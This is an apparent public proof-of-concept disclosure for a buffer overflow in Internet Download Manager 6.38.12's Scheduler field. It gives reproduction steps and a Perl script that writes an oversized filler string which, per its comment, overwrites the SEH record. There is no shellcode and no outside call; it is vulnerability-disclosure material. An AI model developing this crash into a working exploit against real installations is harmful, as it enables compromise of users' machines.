@@ -1,0 +1,31 @@
+# Exploit Title: Internet Download Manager 6.38.12 - Scheduler Downloads Scheduler Buffer Overflow (PoC)
+# Date: November 18, 2020
+# Exploit Author: Vincent Wolterman
+# Vendor Homepage: http://www.internetdownloadmanager.com/
+# Software Link: http://www.internetdownloadmanager.com/download.html
+# Version: 6.38.12
+# Tested on: Windows 7 Professional SP 1 Build 7601; Windows 10 Home Build 19041
+
+# Steps to reproduce crash:
+# 1) Execute provided Perl code
+# 2) Open IDMan_Crash.txt output file
+# 3) Copy contents of text file to clipboard
+# 4) Open Internet Download Manager 6.38
+# 5) From the Menu bar -> Downloads -> Scheduler
+# 6) Check the box for 'Open the following file when done:'
+# 7) Paste the contents of IDMan_Crash.txt into the input field below
+# 8) Click 'Apply' and observe the crash
+
+#!/usr/bin/perl
+
+$baddata = "\x41" x 1302;
+$baddata .= "\x42" x 2; # this length overwrites NSEH on Windows 7 Pro SP 1
+$baddata .= "\x43"x(5000-length($baddata));
+
+$file = "IDMan_Crash.txt";
+open (FILE, '>IDMan_Crash.txt');
+print FILE $baddata;
+close (FILE);
+
+print "Exploit file created [" . $file . "]\n";
+print "Buffer size: " . length($baddata) . "\n";
